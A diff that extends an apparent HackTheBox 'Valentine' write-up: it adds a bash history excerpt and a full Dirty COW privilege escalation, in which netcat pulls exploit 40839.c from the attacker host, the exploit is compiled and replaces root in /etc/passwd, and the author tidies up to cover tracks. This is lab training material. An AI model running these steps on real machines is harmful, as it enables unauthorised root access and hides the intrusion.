@@ -309,6 +309,8 @@ hype@Valentine:/$ cat /etc/issue
 Ubuntu 12.04 LTS \n \l
 ```
 
+That's a pretty outdate OS and kernel..
+
 
 ##### LINUX ENUM
 
@@ -464,6 +466,28 @@ root@Valentine:~# ls
 curl.sh  root.txt
 ```
 
+Out of curiousity, went to go take a look at the `.bash_history` file of `hype`
+and saw there were clues there as well of what amounted to what `hype` was doing
+as he/she was doing before taking a coffee break.....
+
+```
+hype@Valentine:~$ cat .bash_history 
+
+exit
+exot
+exit
+ls -la
+cd /
+ls -la
+cd .devs
+ls -la
+tmux -L dev_sess 
+tmux a -t dev_sess 
+tmux --help
+tmux -S /.devs/dev_sess 
+exit
+```
+
 ### APPENDIX
 
 There was discussion in various forums appearing to reference the Linux "Dirty
@@ -474,3 +498,152 @@ the Linux OS. That would be interesting to also try out.
 https://infosecuritygeek.com/hackthebox-valentine/
 ```
 
+##### DIRTY COW
+
+```
+DirtyCOW bug is a race condition in the Linux kernel’s memory subsystem which
+handles the copy-on-write (COW) breakage of private read-only memory mappings.
+By exploiting this bug, an unprivileged local user could use this flaw to gain
+write access to otherwise read-only memory mappings, thus increasing their
+privileges on the system.
+
+https://dirtycow.ninja/
+```
+
+So let's see what we can find out about attempting this exploit..
+
+```
+$ searchsploit dirty cow
+--------------------------------------------- ----------------------------------
+ Exploit Title                               |  Path
+                                             | (/usr/share/exploitdb/platforms/)
+--------------------------------------------- ----------------------------------
+Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty | linux/local/40616.c
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc | linux/local/40847.cpp
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRAC | linux/local/40838.c
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRAC | linux/local/40839.c
+Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /pro | linux/local/40611.c
+--------------------------------------------- ----------------------------------
+$ cp /usr/share/exploitdb/platforms/linux/local/40839.c .
+```
+
+Let's try using `netcat` to transfer the file over to the victim machine (noting
+that our own ip address is `10.10.16.55`)..
+
+```
+$ sudo ifconfig
+[sudo] password for fortyfunbobby: 
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:febe:c78  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:be:0c:78  txqueuelen 1000  (Ethernet)
+        RX packets 129979  bytes 45471913 (43.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 92333  bytes 13950652 (13.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 922  bytes 46438 (45.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 922  bytes 46438 (45.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.10.16.55  netmask 255.255.254.0  destination 10.10.16.55
+        inet6 fe80::6e8f:e4b1:ed7e:faf3  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef:4::1035  prefixlen 64  scopeid 0x0<global>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
+        RX packets 126  bytes 14162 (13.8 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 213  bytes 17812 (17.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+$ nc -nlvp 1337 < 40839.c
+listening on [any] 1337 ...
+```
+
+```
+hype@Valentine:~/Downloads$ nc 10.10.16.55 1337 > 40839.c
+hype@Valentine:~/Downloads$ ls -l
+total 8
+-rw-rw-r-- 1 hype hype 5006 Jul 17 09:01 40839.c
+```
+
+Now we need to compile the exploit source code to execute it.
+
+For the particular implementation of DirtyCow exploit we used, it automatically
+generates a new passwd file containing a new user “firefart” which overwrites
+the root account. After running the exploit we should be able to login with the
+newly created user with a password that we specify on a prompt. The original
+/etc/passwd file is then backed up to /tmp/passwd.bak.
+
+```
+hype@Valentine:~/Downloads$ head -25 40839.c
+//
+// This exploit uses the pokemon exploit of the dirtycow vulnerability
+// as a base and automatically generates a new passwd line.
+// The user will be prompted for the new password when the binary is run.
+// The original /etc/passwd file is then backed up to /tmp/passwd.bak
+// and overwrites the root account with the generated line.
+// After running the exploit you should be able to login with the newly
+// created user.
+//
+// To use this exploit modify the user values according to your needs.
+//   The default is "firefart".
+//
+// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
+//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
+//
+// Compile with:
+//   gcc -pthread dirty.c -o dirty -lcrypt
+//
+// Then run the newly create binary by either doing:
+//   "./dirty" or "./dirty my-new-password"
+//
+// Afterwards, you can either "su firefart" or "ssh firefart@..."
+//
+// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
+//   mv /tmp/passwd.bak /etc/passwd
+hype@Valentine:~/Downloads$ gcc -pthread 40839.c -o dirty -lcrypt
+```
+
+Now let's try running our exploit!
+
+```
+hype@Valentine:~/Downloads$ ./dirty 
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash
+
+mmap: 7fa120048000
+hype@Valentine:~/Downloads$ head /etc/passwd
+firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash
+/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+hype@Valentine:~/Downloads$ su firefart
+Password: 
+firefart@Valentine:/home/hype/Downloads# ls -l /root
+total 8
+-rwxr-xr-x 1 firefart root 388 Dec 13  2017 curl.sh
+-rw-r--r-- 1 firefart root  33 Dec 13  2017 root.txt
+```
+
+Cool!  Let's cover up our tracks..
+
+```
+firefart@Valentine:/home/hype/Downloads# cd /etc
+firefart@Valentine:/etc# ls -l passwd*
+-rw-r--r-- 1 firefart root 1711 Dec 11  2017 passwd
+-rw------- 1 firefart root 1711 Dec 11  2017 passwd-
+firefart@Valentine:/etc# mv passwd- passwd
+```
